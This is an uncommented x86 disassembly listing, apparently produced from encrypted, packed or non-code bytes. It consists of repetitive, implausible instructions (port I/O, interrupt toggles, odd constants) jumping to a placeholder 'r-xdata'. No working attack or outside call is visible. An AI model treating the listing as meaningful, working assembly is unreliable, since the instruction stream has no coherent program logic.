jmp r-xdata
jpo r-xdata
adc edi [ ebx + 0x7a ]
jpo r-xdata
cmc
jpo r-xdata
adc [ esi ] edx
jmp r-xdata
adc esp [ eax ]
jpo r-xdata
xchg edx eax
adc esp [ edi - 0x57 ]
xchg edx eax
and eax 0xeb7b7b77
sub al 0x84
in eax dx
xlat
jpo r-xdata
xor ch bh
cmp [ edi + 0x11 ] ch
jg r-xdata
test ch ch
xlat
outsd
adc [ edi - 0xe ] edi
cli
call [ ebp + 0x388484b5 ]
xchg edx eax
inc eax
movsd [ edi ] [ esi ]
je r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
jmp r-xdata
aas
pop edi
push ebx
adc edi [ ebx + 0x4b ]
loop r-xdata
test [ esi + esi * 8 + 0x2d2b933e ] al
div dh
test [ esi + 0xd938484 ] 0x927b7b66
js r-xdata
pop esi
push 0x7b
jpo r-xdata
push 0xffffff92
mov [ 0xffffffffeb7b7b64 ] al
jmp r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
clc
cdq
je r-xdata
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
sub edx [ edx + 0x7b7b78d3 ]
inc esi
jle r-xdata
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
sub al 0xf2
cmp eax 0x9443931f
test [ ebx + edx - 0x10cd8570 ] al
cmp eax 0x942f932f
test [ ebx + edx - 0xd385699 ] al
sub al 0xf2
cmp eax 0x943d931b
test [ ebx + edx + 0x111c2a07 ] al
sub edx [ ecx ]
jpo r-xdata
jmp r-xdata

jns r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
jmp r-xdata
jpo r-xdata
je r-xdata
in eax dx
sti
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg [ esp + eax * 4 - 0x48c100e ] al
jpo r-xdata
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
jpo r-xdata
or eax 0x78d3922b
xchg [ esp + eax * 4 + 0x7b660d93 ] al
jpo r-xdata
jpo r-xdata
test al bh
cmp [ edx + 0x74 ] 0xffffffff
jpo r-xdata
cmp esi 0xffffff84
int3
jpo r-xdata
je r-xdata
jl r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7bd7 ]
xchg ebx eax
sub_47aa48
pop ecx
jpo r-xdata
adc edi [ ebx + 0x4b ]
jmp r-xdata
jpo r-xdata
adc edi [ ebx + 0x7a ]
jpo r-xdata
mov cl 0x84
test [ edx ] ch
xchg edx eax
outsd
adc [ edi - 0xe ] edi
call [ ebp + 0x388484b5 ]
xchg edx eax
test [ esi + esi * 8 + 0x2d2b933e ] al
div dh
test [ esi + 0xd938484 ] 0x927b7b66
js r-xdata
mov esp 0x7b7b7bff
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x3e6d44b8 ] al
test [ esp + eax * 4 - 0x28127bd8 ] eax
cli
test [ eax ] bh
jpo r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
cmp eax 0x942f932f
test [ ebx + edx - 0xd385699 ] al
sub al 0xf2
cmp eax 0x943d931b
test [ ebx + edx + 0x111c2a07 ] al
sub edx [ ecx ]
jpo r-xdata
xlat
jpo r-xdata
jpo r-xdata
jpo r-xdata
lodsb [ esi ]
test [ ecx + edx + 0x4b7b137f ] al
je r-xdata
sub edx [ edx + 0x7b7b78d3 ]
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
inc esi
add [ esp + eax * 4 + 0x22ebebeb ] 0x24
jpo r-xdata
je r-xdata
in eax dx
sti
jpo r-xdata
jpo r-xdata
jpo r-xdata
dec ebx
test [ ebx + 0x7b ] bh
jpo r-xdata
cmc
jpo r-xdata
loop r-xdata
xchg edx eax
adc esp [ eax ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
and eax 0xeb7b7b77
sub al 0x84
in eax dx
xlat
jpo r-xdata
xor ch bh
cmp [ edi + 0x11 ] ch
jg r-xdata
xchg [ esp + eax * 4 + 0x7b660d93 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
test [ 0x78d3922b ] cl
jpo r-xdata
adc edi [ ebx + 0x4b ]
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
aas
xchg edx eax
sahf
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
sub al 0xf2
cmp eax 0x9443931f
test [ ebx + edx - 0x10cd8570 ] al
sbb edx [ ebx - 0x7b7b6bc3 ]
adc eax [ edi ]
sub bl [ ecx + edx ]
sub eax 0x7b73c792
jpo r-xdata
inc eax
movsd [ edi ] [ esi ]
je r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
clc
cdq
je r-xdata
jpo r-xdata
or eax 0x78d3922b
jmp r-xdata
aas
pop edi
push ebx
adc edi [ ebx + 0x4b ]
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
test al bh
cmp [ edx + 0x74 ] 0xffffffff
jpo r-xdata
cmp esi 0xffffff84
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
inc esi
jle r-xdata
sbb eax 0x925b42f8
jmp r-xdata
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
jmp r-xdata
jpo r-xdata
test [ eax ] ch
jmp r-xdata
pop esi
push 0x7b
jpo r-xdata
push 0xffffff92
mov [ 0xffffffffeb7b7b64 ] al
jmp r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
int3
jpo r-xdata
je r-xdata
jl r-xdata
adc [ esi ] edx
jmp r-xdata
adc esp [ edi - 0x57 ]
test ch ch
xlat
jmp r-xdata

jns r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg [ esp + eax * 4 - 0x48c100e ] al
jpo r-xdata
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
sub eax [ ebp + ebp * 8 + 0x7b7b7bd7 ]
xchg ebx eax
jmp r-xdata
jpo r-xdata
xchg edx eax
shl [ ebp + 0x7b ] 0x1
jpo r-xdata
clc
or [ edx + 0x74 ] 0xfe
dec ebx
jpo r-xdata
cmp [ ebp - 0x14147b7c ] ch
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax

xchg edx eax
inc ecx
out dx al
jpo r-xdata
jmp r-xdata
dec eax
mov ebx 0x8485c192
jmp r-xdata
clc
sub_47aa4e
jmp r-xdata
sub dl [ edx - 0x7b7b4e74 ]
xchg ebx eax
pushfd
mov ebp 0xcf928484
pop ecx
jpo r-xdata
adc edi [ ebx + 0x4b ]
jmp r-xdata
jpo r-xdata
adc edi [ ebx + 0x7a ]
jpo r-xdata
mov cl 0x84
test [ edx ] ch
xchg edx eax
outsd
adc [ edi - 0xe ] edi
call [ ebp + 0x388484b5 ]
xchg edx eax
test [ esi + esi * 8 + 0x2d2b933e ] al
div dh
test [ esi + 0xd938484 ] 0x927b7b66
js r-xdata
mov esp 0x7b7b7bff
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x3e6d44b8 ] al
test [ esp + eax * 4 - 0x28127bd8 ] eax
cli
test [ eax ] bh
jpo r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
cmp eax 0x942f932f
test [ ebx + edx - 0xd385699 ] al
sub al 0xf2
cmp eax 0x943d931b
test [ ebx + edx + 0x111c2a07 ] al
sub edx [ ecx ]
jpo r-xdata
xlat
jpo r-xdata
jpo r-xdata
jpo r-xdata
lodsb [ esi ]
test [ ecx + edx + 0x4b7b137f ] al
je r-xdata
sub edx [ edx + 0x7b7b78d3 ]
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
inc esi
add [ esp + eax * 4 + 0x22ebebeb ] 0x24
jpo r-xdata
je r-xdata
in eax dx
sti
jpo r-xdata
jpo r-xdata
jpo r-xdata
dec ebx
test [ ebx + 0x7b ] bh
jpo r-xdata
cmc
jpo r-xdata
loop r-xdata
xchg edx eax
adc esp [ eax ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
and eax 0xeb7b7b77
sub al 0x84
in eax dx
xlat
jpo r-xdata
xor ch bh
cmp [ edi + 0x11 ] ch
jg r-xdata
xchg [ esp + eax * 4 + 0x7b660d93 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
test [ 0x78d3922b ] cl
jpo r-xdata
adc edi [ ebx + 0x4b ]
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
aas
xchg edx eax
sahf
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
sub al 0xf2
cmp eax 0x9443931f
test [ ebx + edx - 0x10cd8570 ] al
sbb edx [ ebx - 0x7b7b6bc3 ]
adc eax [ edi ]
sub bl [ ecx + edx ]
sub eax 0x7b73c792
jpo r-xdata
inc eax
movsd [ edi ] [ esi ]
je r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
clc
cdq
je r-xdata
jpo r-xdata
or eax 0x78d3922b
jmp r-xdata
aas
pop edi
push ebx
adc edi [ ebx + 0x4b ]
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
test al bh
cmp [ edx + 0x74 ] 0xffffffff
jpo r-xdata
cmp esi 0xffffff84
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
inc esi
jle r-xdata
sbb eax 0x925b42f8
jmp r-xdata
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
jmp r-xdata
jpo r-xdata
test [ eax ] ch
jmp r-xdata
pop esi
push 0x7b
jpo r-xdata
push 0xffffff92
mov [ 0xffffffffeb7b7b64 ] al
jmp r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
int3
jpo r-xdata
je r-xdata
jl r-xdata
adc [ esi ] edx
jmp r-xdata
adc esp [ edi - 0x57 ]
test ch ch
xlat
jmp r-xdata

jns r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg [ esp + eax * 4 - 0x48c100e ] al
jpo r-xdata
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
sub eax [ ebp + ebp * 8 + 0x7b7b7bd7 ]
xchg ebx eax
jmp r-xdata
jpo r-xdata
xchg edx eax
shl [ ebp + 0x7b ] 0x1
jpo r-xdata
clc
or [ edx + 0x74 ] 0xfe
dec ebx
jpo r-xdata
cmp [ ebp - 0x14147b7c ] ch
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax

xchg edx eax
inc ecx
out dx al
jpo r-xdata
jmp r-xdata
dec eax
mov ebx 0x8485c192
jmp r-xdata
clc
sub_47aa57
jmp r-xdata
test ch ch
xlat
jpo r-xdata
sbb eax 0x92892ef2
mov bh 0x84
jpo r-xdata
jpo r-xdata
jmp r-xdata
test [ ebx - 0x6c7b7b7a ] 0x6d
mov esp 0xfdf08484
dec eax
mov ebx 0x8485c192
jmp r-xdata
jmp r-xdata
xlat
jpo r-xdata
jpo r-xdata
clc
xchg ebx eax
pushfd
mov ebp 0xcf928484
jpo r-xdata
jpo r-xdata
dec ebx
test [ ebx + 0x7b ] bh
jpo r-xdata
test [ eax ] bh
jpo r-xdata
jmp r-xdata
test [ 0x78d3922b ] cl
jpo r-xdata
adc edi [ ebx + 0x4b ]
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
aas
xchg edx eax
sahf
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
sbb edx [ ebx - 0x7b7b6bc3 ]
adc eax [ edi ]
sub bl [ ecx + edx ]
sub eax 0x7b73c792
jpo r-xdata
mov esp 0x7b7b7bff
jpo r-xdata
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x3e6d44b8 ] al
test [ esp + eax * 4 - 0x28127bd8 ] eax
lodsb [ esi ]
test [ ecx + edx + 0x4b7b137f ] al
jpo r-xdata
je r-xdata
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
sbb eax 0x925b42f8
jmp r-xdata
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
jmp r-xdata
inc esi
add [ esp + eax * 4 + 0x22ebebeb ] 0x24
jpo r-xdata
test [ eax ] ch
jmp r-xdata
jpo r-xdata
adc edi [ ebx + 0x7a ]
jpo r-xdata
cmc
jpo r-xdata
adc [ esi ] edx
jmp r-xdata
adc esp [ eax ]
jpo r-xdata
xchg edx eax
adc esp [ edi - 0x57 ]
xchg edx eax
and eax 0xeb7b7b77
sub al 0x84
in eax dx
xlat
jpo r-xdata
xor ch bh
cmp [ edi + 0x11 ] ch
jg r-xdata
test ch ch
xlat
outsd
adc [ edi - 0xe ] edi
cli
call [ ebp + 0x388484b5 ]
xchg edx eax
inc eax
movsd [ edi ] [ esi ]
je r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
jmp r-xdata
aas
pop edi
push ebx
adc edi [ ebx + 0x4b ]
loop r-xdata
test [ esi + esi * 8 + 0x2d2b933e ] al
div dh
test [ esi + 0xd938484 ] 0x927b7b66
js r-xdata
pop esi
push 0x7b
jpo r-xdata
push 0xffffff92
mov [ 0xffffffffeb7b7b64 ] al
jmp r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
clc
cdq
je r-xdata
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
sub edx [ edx + 0x7b7b78d3 ]
inc esi
jle r-xdata
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
sub al 0xf2
cmp eax 0x9443931f
test [ ebx + edx - 0x10cd8570 ] al
cmp eax 0x942f932f
test [ ebx + edx - 0xd385699 ] al
sub al 0xf2
cmp eax 0x943d931b
test [ ebx + edx + 0x111c2a07 ] al
sub edx [ ecx ]
jpo r-xdata
jmp r-xdata

jns r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
jmp r-xdata
jpo r-xdata
je r-xdata
in eax dx
sti
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg [ esp + eax * 4 - 0x48c100e ] al
jpo r-xdata
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
jpo r-xdata
or eax 0x78d3922b
xchg [ esp + eax * 4 + 0x7b660d93 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
test al bh
cmp [ edx + 0x74 ] 0xffffffff
jpo r-xdata
cmp esi 0xffffff84
xchg edx eax
shl [ ebp + 0x7b ] 0x1
jpo r-xdata
clc
or [ edx + 0x74 ] 0xfe
dec ebx
jpo r-xdata
cmp [ ebp - 0x14147b7c ] ch
jmp r-xdata
int3
jpo r-xdata
je r-xdata
jl r-xdata
test bl ch
jmp r-xdata
xchg edx eax

xchg edx eax
inc ecx
mov cl 0x84
test [ edx ] ch
xchg edx eax
out dx al
jpo r-xdata
jmp r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7bd7 ]
xchg ebx eax
sub_47aaa5
push es
xchg [ eax + 0x74 ] edi
stc
jmp r-xdata

cmpsd [ esi ] [ edi ]
xchg [ esp + eax * 4 - 0x48c100e ] al
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
shl [ ebp + 0x7b ] 0x1
jpo r-xdata
clc
or [ edx + 0x74 ] 0xfe
dec ebx
jpo r-xdata
cmp [ ebp - 0x14147b7c ] ch
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax

xchg edx eax
inc ecx
mov cl 0x84
test [ edx ] ch
xchg edx eax
out dx al
jpo r-xdata
jmp r-xdata
dec eax
mov ebx 0x8485c192
jmp r-xdata
xlat
jpo r-xdata
jpo r-xdata
clc
jpo r-xdata
jpo r-xdata
dec ebx
test [ ebx + 0x7b ] bh
jpo r-xdata
test [ eax ] bh
jpo r-xdata
jmp r-xdata
test [ 0x78d3922b ] cl
jpo r-xdata
adc edi [ ebx + 0x4b ]
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
aas
xchg edx eax
sahf
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
sbb edx [ ebx - 0x7b7b6bc3 ]
adc eax [ edi ]
sub bl [ ecx + edx ]
sub eax 0x7b73c792
jpo r-xdata
mov esp 0x7b7b7bff
jpo r-xdata
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x3e6d44b8 ] al
test [ esp + eax * 4 - 0x28127bd8 ] eax
lodsb [ esi ]
test [ ecx + edx + 0x4b7b137f ] al
jpo r-xdata
je r-xdata
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
sbb eax 0x925b42f8
jmp r-xdata
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
jmp r-xdata
inc esi
add [ esp + eax * 4 + 0x22ebebeb ] 0x24
jpo r-xdata
test [ eax ] ch
jmp r-xdata
jpo r-xdata
adc edi [ ebx + 0x7a ]
jpo r-xdata
cmc
jpo r-xdata
adc [ esi ] edx
jmp r-xdata
adc esp [ eax ]
jpo r-xdata
xchg edx eax
adc esp [ edi - 0x57 ]
xchg edx eax
and eax 0xeb7b7b77
sub al 0x84
in eax dx
xlat
jpo r-xdata
xor ch bh
cmp [ edi + 0x11 ] ch
jg r-xdata
test ch ch
xlat
outsd
adc [ edi - 0xe ] edi
cli
call [ ebp + 0x388484b5 ]
xchg edx eax
inc eax
movsd [ edi ] [ esi ]
je r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
jmp r-xdata
aas
pop edi
push ebx
adc edi [ ebx + 0x4b ]
loop r-xdata
test [ esi + esi * 8 + 0x2d2b933e ] al
div dh
test [ esi + 0xd938484 ] 0x927b7b66
js r-xdata
pop esi
push 0x7b
jpo r-xdata
push 0xffffff92
mov [ 0xffffffffeb7b7b64 ] al
jmp r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
clc
cdq
je r-xdata
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
sub edx [ edx + 0x7b7b78d3 ]
inc esi
jle r-xdata
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
sub al 0xf2
cmp eax 0x9443931f
test [ ebx + edx - 0x10cd8570 ] al
cmp eax 0x942f932f
test [ ebx + edx - 0xd385699 ] al
sub al 0xf2
cmp eax 0x943d931b
test [ ebx + edx + 0x111c2a07 ] al
sub edx [ ecx ]
jpo r-xdata
jns r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
jmp r-xdata
jpo r-xdata
je r-xdata
in eax dx
sti
jpo r-xdata
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
jpo r-xdata
or eax 0x78d3922b
xchg [ esp + eax * 4 + 0x7b660d93 ] al
jpo r-xdata
jpo r-xdata
test al bh
cmp [ edx + 0x74 ] 0xffffffff
jpo r-xdata
cmp esi 0xffffff84
int3
jpo r-xdata
je r-xdata
jl r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7bd7 ]
xchg ebx eax
sub_47aab3
xchg [ esp + eax * 4 - 0xddd1415 ] eax
xchg esi edi
mov al [ 0xffffffffacdaff74 ]
jpo r-xdata
adc edi [ ebx + 0x7a ]
jpo r-xdata
outsd
adc [ edi - 0xe ] edi
call [ ebp + 0x388484b5 ]
xchg edx eax
test [ esi + esi * 8 + 0x2d2b933e ] al
div dh
test [ esi + 0xd938484 ] 0x927b7b66
js r-xdata
mov esp 0x7b7b7bff
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x3e6d44b8 ] al
test [ esp + eax * 4 - 0x28127bd8 ] eax
cli
test [ eax ] bh
jpo r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
cmp eax 0x942f932f
test [ ebx + edx - 0xd385699 ] al
sub al 0xf2
cmp eax 0x943d931b
test [ ebx + edx + 0x111c2a07 ] al
sub edx [ ecx ]
jpo r-xdata
xlat
jpo r-xdata
jpo r-xdata
test [ ecx + edx + 0x4b7b137f ] al
jpo r-xdata
lodsb [ esi ]
je r-xdata
sub edx [ edx + 0x7b7b78d3 ]
test [ ebp + ebx - 0x6da4bd08 ] al
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test ah ch
sti
inc esi
add [ esp + eax * 4 + 0x22ebebeb ] 0x24
jpo r-xdata
je r-xdata
in eax dx
sti
jpo r-xdata
jpo r-xdata
jpo r-xdata
dec ebx
test [ ebx + 0x7b ] bh
jpo r-xdata
cmc
jpo r-xdata
loop r-xdata
xchg edx eax
adc esp [ eax ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
and eax 0xeb7b7b77
sub al 0x84
in eax dx
xlat
jpo r-xdata
xor ch bh
cmp [ edi + 0x11 ] ch
jg r-xdata
xchg [ esp + eax * 4 + 0x7b660d93 ] al
jpo r-xdata
jpo r-xdata
jmp r-xdata
test [ 0x78d3922b ] cl
jpo r-xdata
adc edi [ ebx + 0x4b ]
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
aas
xchg edx eax
sahf
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
sub al 0xf2
cmp eax 0x9443931f
test [ ebx + edx - 0x10cd8570 ] al
sbb edx [ ebx - 0x7b7b6bc3 ]
adc eax [ edi ]
sub bl [ ecx + edx ]
sub eax 0x7b73c792
jpo r-xdata
inc eax
movsd [ edi ] [ esi ]
je r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
clc
cdq
je r-xdata
jpo r-xdata
or eax 0x78d3922b
jmp r-xdata
aas
pop edi
push ebx
adc edi [ ebx + 0x4b ]
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
test al bh
cmp [ edx + 0x74 ] 0xffffffff
jpo r-xdata
cmp esi 0xffffff84
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
inc esi
jle r-xdata
sbb eax 0x925b42f8
jmp r-xdata
dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
jmp r-xdata
jpo r-xdata
test [ eax ] ch
jmp r-xdata
pop esi
push 0x7b
jpo r-xdata
push 0xffffff92
mov [ 0xffffffffeb7b7b64 ] al
jmp r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
mov eax [ esp + eax * 4 + 0x6f21deb ]
xchg ecx eax
xchg edx eax
int3
jpo r-xdata
je r-xdata
jl r-xdata
adc [ esi ] edx
jmp r-xdata
adc esp [ edi - 0x57 ]
test ch ch
xlat
jmp r-xdata

jns r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg [ esp + eax * 4 - 0x48c100e ] al
jpo r-xdata
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
sub eax [ ebp + ebp * 8 + 0x7b7b7bd7 ]
xchg ebx eax
jmp r-xdata
jpo r-xdata
xchg edx eax
shl [ ebp + 0x7b ] 0x1
jpo r-xdata
clc
or [ edx + 0x74 ] 0xfe
dec ebx
jpo r-xdata
cmp [ ebp - 0x14147b7c ] ch
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax

xchg edx eax
inc ecx
mov cl 0x84
test [ edx ] ch
xchg edx eax
out dx al
jpo r-xdata
jmp r-xdata
dec eax
mov ebx 0x8485c192
jmp r-xdata
clc
sub_47aae9
test eax 0x892ef21d
xchg edx eax
mov bh 0x84
jpo r-xdata
dec eax
mov ebx 0x8485c192
jmp r-xdata
xlat
jpo r-xdata
jpo r-xdata
clc
jpo r-xdata
jpo r-xdata
dec ebx
test [ ebx + 0x7b ] bh
jpo r-xdata
test [ eax ] bh
jpo r-xdata
jmp r-xdata
test [ 0x78d3922b ] cl
jpo r-xdata
adc edi [ ebx + 0x4b ]
fidivr [ esp + eax * 4 + 0x7a83f884 ]
je r-xdata
aas
xchg edx eax
sahf
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
sbb edx [ ebx - 0x7b7b6bc3 ]
adc eax [ edi ]
sub bl [ ecx + edx ]
sub eax 0x7b73c792
jpo r-xdata
mov esp 0x7b7b7bff
jpo r-xdata
movsd [ edi ] [ esi ]
test [ esp + eax * 4 - 0x3e6d44b8 ] al
test [ esp + eax * 4 - 0x28127bd8 ] eax
lodsb [ esi ]
test [ ecx + edx + 0x4b7b137f ] al
jpo r-xdata
je r-xdata
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
